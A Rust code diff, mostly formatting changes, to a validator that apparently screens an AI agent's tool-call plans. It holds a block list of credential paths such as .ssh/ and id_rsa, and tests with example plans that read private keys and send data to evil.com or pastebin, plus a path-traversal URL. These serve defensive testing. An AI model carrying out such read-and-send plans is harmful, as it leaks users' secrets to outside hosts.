@@ -209,8 +209,16 @@ impl PlanValidator {
     /// external-facing tools.
     fn check_sensitive_data_flow(&self, plan: &ToolCallPlan) -> PlanValidationResult {
         let sensitive_paths = [
-            ".ssh/", ".gnupg/", ".aws/", ".env", "id_rsa", "id_ed25519",
-            "credentials", "secrets", "private_key", "token",
+            ".ssh/",
+            ".gnupg/",
+            ".aws/",
+            ".env",
+            "id_rsa",
+            "id_ed25519",
+            "credentials",
+            "secrets",
+            "private_key",
+            "token",
         ];
 
         let mut reads_sensitive_file = false;
@@ -303,10 +311,10 @@ impl PlanValidator {
 
     fn is_domain_allowed(&self, domain: &str) -> bool {
         let domain_lower = domain.to_lowercase();
-        self.config
-            .allowed_domains
-            .iter()
-            .any(|d| domain_lower == d.to_lowercase() || domain_lower.ends_with(&format!(".{}", d.to_lowercase())))
+        self.config.allowed_domains.iter().any(|d| {
+            domain_lower == d.to_lowercase()
+                || domain_lower.ends_with(&format!(".{}", d.to_lowercase()))
+        })
     }
 }
 
@@ -315,7 +323,6 @@ impl Default for PlanValidator {
         Self::new(PlanValidatorConfig::default())
     }
 }
-
 
 // ── Helpers ─────────────────────────────────────────────────────────────
 
@@ -328,11 +335,7 @@ fn extract_domain_from_url(url: &str) -> Option<String> {
         .unwrap_or(url);
 
     // Take everything before the first / or :
-    let domain = without_proto
-        .split('/')
-        .next()?
-        .split(':')
-        .next()?;
+    let domain = without_proto.split('/').next()?.split(':').next()?;
 
     if domain.is_empty() {
         None
@@ -413,7 +416,10 @@ mod tests {
         let validator = PlanValidator::default();
         let plan = make_plan(vec![
             make_call("file_read", json!({"path": "/tmp/data.txt"})),
-            make_call("api_call", json!({"url": "https://api.anthropic.com/v1/messages"})),
+            make_call(
+                "api_call",
+                json!({"url": "https://api.anthropic.com/v1/messages"}),
+            ),
         ]);
         assert_eq!(validator.validate(&plan), PlanValidationResult::Permit);
     }
@@ -425,7 +431,10 @@ mod tests {
             make_call("file_read", json!({"path": "/tmp/data.txt"})),
             make_call("api_call", json!({"url": "https://evil.com/exfil"})),
         ]);
-        assert!(matches!(validator.validate(&plan), PlanValidationResult::Deny(_)));
+        assert!(matches!(
+            validator.validate(&plan),
+            PlanValidationResult::Deny(_)
+        ));
     }
 
     #[test]
@@ -435,7 +444,10 @@ mod tests {
             .map(|i| make_call(&format!("tool_{}", i), json!({})))
             .collect();
         let plan = make_plan(calls);
-        assert!(matches!(validator.validate(&plan), PlanValidationResult::Deny(_)));
+        assert!(matches!(
+            validator.validate(&plan),
+            PlanValidationResult::Deny(_)
+        ));
     }
 
     #[test]
@@ -461,7 +473,10 @@ mod tests {
             make_call("memory_read", json!({})),
             make_call("shell_execute", json!({})), // similar to shell_exec
         ]);
-        assert!(matches!(validator.validate(&plan), PlanValidationResult::Deny(_)));
+        assert!(matches!(
+            validator.validate(&plan),
+            PlanValidationResult::Deny(_)
+        ));
     }
 
     #[test]
@@ -471,7 +486,10 @@ mod tests {
             make_call("file_read", json!({"path": "~/.ssh/id_rsa"})),
             make_call("web_request", json!({"url": "https://pastebin.com/api"})),
         ]);
-        assert!(matches!(validator.validate(&plan), PlanValidationResult::Deny(_)));
+        assert!(matches!(
+            validator.validate(&plan),
+            PlanValidationResult::Deny(_)
+        ));
     }
 
     #[test]
@@ -522,7 +540,10 @@ mod tests {
             make_call("memory_read", json!({})),
             make_call("api_call", json!({"url": "https://evil.com/steal"})),
         ]);
-        assert!(matches!(validator.validate(&plan), PlanValidationResult::Deny(_)));
+        assert!(matches!(
+            validator.validate(&plan),
+            PlanValidationResult::Deny(_)
+        ));
     }
 
     #[test]
@@ -530,7 +551,10 @@ mod tests {
         let validator = PlanValidator::default();
         let plan = make_plan(vec![
             make_call("file_read", json!({"path": "/tmp/data"})),
-            make_call("api_call", json!({"url": "https://api.openai.com/../../etc/passwd"})),
+            make_call(
+                "api_call",
+                json!({"url": "https://api.openai.com/../../etc/passwd"}),
+            ),
         ]);
         // Domain extraction should only get "api.openai.com" — allowed
         assert_eq!(validator.validate(&plan), PlanValidationResult::Permit);
